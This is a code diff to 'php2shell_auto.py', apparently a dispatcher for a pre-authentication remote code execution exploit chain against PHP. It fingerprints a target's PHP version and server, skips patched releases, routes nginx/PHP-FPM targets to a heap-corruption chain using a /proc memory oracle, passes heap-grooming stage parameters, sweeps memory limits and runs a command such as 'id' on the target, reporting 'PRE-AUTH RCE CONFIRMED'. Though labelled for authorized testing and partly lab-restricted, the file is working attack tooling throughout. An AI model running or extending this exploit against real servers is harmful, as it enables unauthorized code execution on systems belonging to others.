@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 """
 php2shell_auto.py — version-aware dispatcher for the PHP2Shell RCE chain.
 
@@ -7,11 +6,14 @@ Flow
 ----
 1. Fingerprint the target (X-Powered-By, Server, PHP version in the body).
 2. Reject versions at or above the fixed release.
-3. Compare the target OS with the profile (Debian/Ubuntu/Fedora/Alpine...).
-4. Load the verified build profile and take the libphp offsets and heap
+3. Route by SAPI: nginx (PHP-FPM) targets go to the FPM chain
+   (tools/php2shell_fpm.py, local lab / oracle mode); Apache targets
+   continue with the upstream progress-cache chain.
+4. Compare the target OS with the profile (Debian/Ubuntu/Fedora/Alpine...).
+5. Load the verified build profile and take the libphp offsets and heap
    parameters from it.
-5. Run the chain, sweeping typical memory limits unless one is supplied.
-6. Print a Wiz-style staged log and a result box.
+6. Run the chain, sweeping typical memory limits unless one is supplied.
+7. Print a Wiz-style staged log and a result box.
 
 Proof handling is automatic:
   - local target: read the proof file written to the mounted /out;
@@ -22,25 +24,24 @@ Authorized testing only.
 """
 
 from __future__ import annotations
-from php2shell_paths import default_repo_dir
-from php2shell_upstream import patch_cookie_decode, patch_params, patch_tls
-from php2shell_vessel import pads_to_spec
 
 import argparse
+import contextlib
 import glob
+import ipaddress
 import json
 import os
-import ipaddress
 import re
 import socket
 import ssl
 import subprocess
-import threading
-import time
 import sys
 import urllib.parse
 
+from php2shell_paths import default_repo_dir
 from php2shell_ui import UI
+from php2shell_upstream import patch_cookie_decode, patch_params, patch_tls
+from php2shell_vessel import pads_to_spec
 
 FIXED = {"8.2": 35, "8.3": 36, "8.4": 27, "8.5": 12}
 HERE = os.path.dirname(os.path.abspath(__file__))
@@ -125,6 +126,81 @@ def classify(version: str):
     return branch, fixed, (patch >= fixed if fixed else None)
 
 
+def detect_sapi(server: str) -> str:
+    """Best-effort SAPI guess from the Server header: nginx in front of
+    PHP-FPM is the common non-Apache shape."""
+    text = (server or "").lower()
+    if "apache" in text:
+        return "apache"
+    if "nginx" in text:
+        return "fpm"
+    return "unknown"
+
+
+def proof_path_from_command(command: str, default: str = "out/p1") -> str:
+    if ">" in command:
+        tail = command.rsplit(">", 1)[1].strip()
+        if tail:
+            return tail.lstrip("/")
+    return default
+
+
+def run_fpm_chain(ui, args, version: str) -> int:
+    """Route an nginx+PHP-FPM target to tools/php2shell_fpm.py.
+
+    The FPM chain (stale BG(unserialize) after a post-RINIT OOM) still needs
+    the lab builder/session endpoints and, for `endgame`, the local /proc
+    oracle.  `no-oracle` can leak the chunk/PIE bases over HTTP, but the
+    shipped dispatcher remains loopback-only."""
+    import php2shell_fpm as fpm
+
+    host = urllib.parse.urlsplit(
+        args.target if "://" in args.target else "http://" + args.target
+    ).hostname or ""
+    if not is_loopback(host):
+        ui.crit("the FPM chain needs local /proc oracle access (lab mode)")
+        ui.info("remote FPM still requires the builder/session endpoints (lab-only)")
+        ui.result(False, "FPM REMOTE UNSUPPORTED", f"PHP {version} behind a non-loopback front")
+        return 3
+
+    base = args.target if "://" in args.target else "http://" + args.target
+    builder = args.builder or base
+    # the auto defaults (id>/out/p1) target the Apache chain's mounted /out;
+    # the FPM chain runs with the pool chdir as cwd and writes relative paths
+    command = args.command
+    if command in ("id>/out/p1", "id>p1"):
+        command = "id>out/p1"
+    proof_file = args.proof_file or proof_path_from_command(command)
+
+    ui.stage("FPM CHAIN", f"PHP {version} via {base}")
+    ui.info(f"builder: {builder}")
+    ui.info(f"command: {command}  (worker cwd = pool chdir)")
+    ui.info("calibration oracle: /proc/<worker>/mem (local lab)")
+
+    if args.dry_run:
+        cmd = [sys.executable, os.path.join(HERE, "php2shell_fpm.py"),
+               "--base", base, "--builder", builder, "--version", version,
+               "--command", command, "--proof-file", proof_file]
+        if args.allow_remote:
+            cmd.append("--allow-remote")
+        cmd.append("endgame")
+        ui.command(cmd)
+        return 0
+
+    ns = argparse.Namespace(
+        base=base,
+        builder=builder,
+        version=version,
+        command=command,
+        proof_file=proof_file,
+        size=4 << 20,
+    )
+    rc = fpm.cmd_endgame(ns)
+    ui.result(rc == 0, "RCE" if rc == 0 else "FAILED",
+              f"PHP {version} fpm chain" if rc == 0 else "no proof file")
+    return rc
+
+
 def is_loopback(host: str) -> bool:
     try:
         infos = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
@@ -170,7 +246,7 @@ def load_profiles(directory: str):
     profiles = []
     for path in sorted(glob.glob(os.path.join(directory, "*.json"))):
         try:
-            with open(path, "r", encoding="utf-8") as fh:
+            with open(path, encoding="utf-8") as fh:
                 data = json.load(fh)
             if not isinstance(data, dict) or "php_version" not in data:
                 continue
@@ -236,13 +312,12 @@ def interactive_loop(args, profile, outdir, ui: UI) -> int:
             continue
         stage_script(outdir, line)
         output = os.path.join(outdir, "o")
-        try:
+        with contextlib.suppress(OSError):
             os.unlink(output)
-        except OSError:
-            pass
         rc = run_upstream(args, profile, output, huge, ui, stream=False)
         if os.path.isfile(output):
-            print(open(output, "r", encoding="utf-8", errors="replace").read().rstrip())
+            with open(output, encoding="utf-8", errors="replace") as handle:
+                print(handle.read().rstrip())
         else:
             ui.warn(f"no output (chain exit {rc})")
     return 0
@@ -334,10 +409,8 @@ class WorkerPins:
                    f"User-Agent: php2shell-pin/1.0\r\nConnection: keep-alive\r\n\r\n").encode()
             s.sendall(req)
             s.settimeout(3)
-            try:
+            with contextlib.suppress(OSError):
                 s.recv(65536)
-            except OSError:
-                pass
             self.socks.append(s)
 
     @classmethod
@@ -370,32 +443,24 @@ class WorkerPins:
                 s.sendall(req)
                 s.settimeout(2)
                 data = s.recv(65536)
-            except socket.timeout:
+            except TimeoutError:
                 if s is not None:
-                    try:
+                    with contextlib.suppress(OSError):
                         s.close()
-                    except OSError:
-                        pass
                 break
             except OSError:
                 if s is not None:
-                    try:
+                    with contextlib.suppress(OSError):
                         s.close()
-                    except OSError:
-                        pass
                 break
             if not data:
-                try:
+                with contextlib.suppress(OSError):
                     s.close()
-                except OSError:
-                    pass
                 break
             head = data.split(b"\r\n\r\n", 1)[0].lower()
             if b"connection: close" in head:
-                try:
+                with contextlib.suppress(OSError):
                     s.close()
-                except OSError:
-                    pass
                 for p in pins:
                     p.close()
                 return None
@@ -409,10 +474,8 @@ class WorkerPins:
 
     def close(self) -> None:
         for s in self.socks:
-            try:
+            with contextlib.suppress(OSError):
                 s.close()
-            except OSError:
-                pass
 
 
 def parse_probe_response(data: bytes) -> dict:
@@ -565,6 +628,18 @@ def run_upstream(args, profile, proof, huge_mb, ui: UI, stream: bool = True,
                          ("stage2_v", "P2S_STAGE2_V")):
         if stages.get(key) is not None:
             env[env_key] = str(stages[key])
+    pads = stages.get("stage3_pads")
+    if pads:
+        env["P2S_STAGE3_PADS"] = ",".join(f"{a}:{b}" for a, b in pads)
+    stage3_cookie = stages.get("stage3_cookie")
+    if stage3_cookie is not None:
+        env["P2S_STAGE3_COOKIE"] = "1" if stage3_cookie else "0"
+    for key, env_key in (("stage3_wfields", "P2S_STAGE3_WFIELDS"),
+                         ("stage3_fake_len", "P2S_STAGE3_FAKE_LEN"),
+                         ("stage3_fakes", "P2S_STAGE3_FAKES"),
+                         ("stage3_b_name_len", "P2S_STAGE3_B_NAME_LEN")):
+        if stages.get(key) is not None:
+            env[env_key] = str(stages[key])
 
     return _run_exploit_cmd(cmd, ui, stream, sink, env)
 
@@ -698,13 +773,17 @@ def main() -> int:
                     help="CPU architecture; required for remote targets, auto-detected locally")
     ap.add_argument("--profile", default=None,
                     help="force a profile by name/path substring (needed when a version has several builds)")
+    ap.add_argument("--sapi", choices=("auto", "apache", "fpm"), default="auto",
+                    help="override the SAPI detection (fpm = nginx + PHP-FPM chain)")
+    ap.add_argument("--builder", default=None,
+                    help="FPM chain builder endpoint (default: the target itself)")
     ap.add_argument("--no-color", action="store_true")
     args = ap.parse_args()
 
     profiles = load_profiles(args.profiles)
     catalog = {}
     try:
-        with open(args.catalog, "r", encoding="utf-8") as fh:
+        with open(args.catalog, encoding="utf-8") as fh:
             catalog = json.load(fh)
     except (OSError, ValueError):
         pass
@@ -779,6 +858,11 @@ def main() -> int:
         return 0
     if fixed is None:
         ui.warn(f"branch {branch} is outside the fix matrix (EOL/unpatched)")
+
+    sapi = args.sapi if args.sapi != "auto" else detect_sapi(server)
+    if sapi == "fpm":
+        ui.info(f"SAPI: fpm (server header {server!r}); using the FPM chain")
+        return run_fpm_chain(ui, args, version)
 
     if args.profile:
         matches = [p for p in profiles
@@ -880,7 +964,8 @@ def main() -> int:
         return 4
     if args.script:
         try:
-            body = open(args.script, "r", encoding="utf-8").read()
+            with open(args.script, encoding="utf-8") as handle:
+                body = handle.read()
         except OSError as exc:
             ui.crit(f"cannot read {args.script}: {exc}")
             return 4
@@ -924,8 +1009,10 @@ def main() -> int:
         # PHP reject it before parsing (no OOM, no leak, no error). Drop the
         # candidates it would block so the sweep never wastes a run on them.
         post_mb = detected["post_max_size"] // (1024 * 1024)
-        feasible = [l for l in limits if oom_for(l, profile) <= post_mb]
-        dropped = [l for l in limits if oom_for(l, profile) > post_mb]
+        feasible = [limit_mb for limit_mb in limits
+                    if oom_for(limit_mb, profile) <= post_mb]
+        dropped = [limit_mb for limit_mb in limits
+                   if oom_for(limit_mb, profile) > post_mb]
         if dropped:
             ui.warn(f"post_max_size={post_mb}M would reject the OOM bodies for {dropped}; skipped")
         if not feasible:
@@ -987,10 +1074,8 @@ def main() -> int:
                 label += f"  ·  retry {attempt - 1}"
             ui.stage("EXECUTE", label)
             if proof and os.path.exists(proof):
-                try:
+                with contextlib.suppress(OSError):
                     os.unlink(proof)
-                except OSError:
-                    pass
             sink = {}
             rc = run_upstream(args, profile, proof, huge, ui, sink=sink)
             if rc == 0 or args.dry_run:
@@ -1016,10 +1101,9 @@ def main() -> int:
 
     detail = "proof retrieved by --fetch"
     if proof and os.path.isfile(proof):
-        try:
-            detail = open(proof, "r", encoding="utf-8", errors="replace").read().strip()
-        except OSError:
-            pass
+        with contextlib.suppress(OSError), \
+                open(proof, encoding="utf-8", errors="replace") as handle:
+            detail = handle.read().strip()
     ui.result(True, "PRE-AUTH RCE CONFIRMED", detail)
     return 0
 
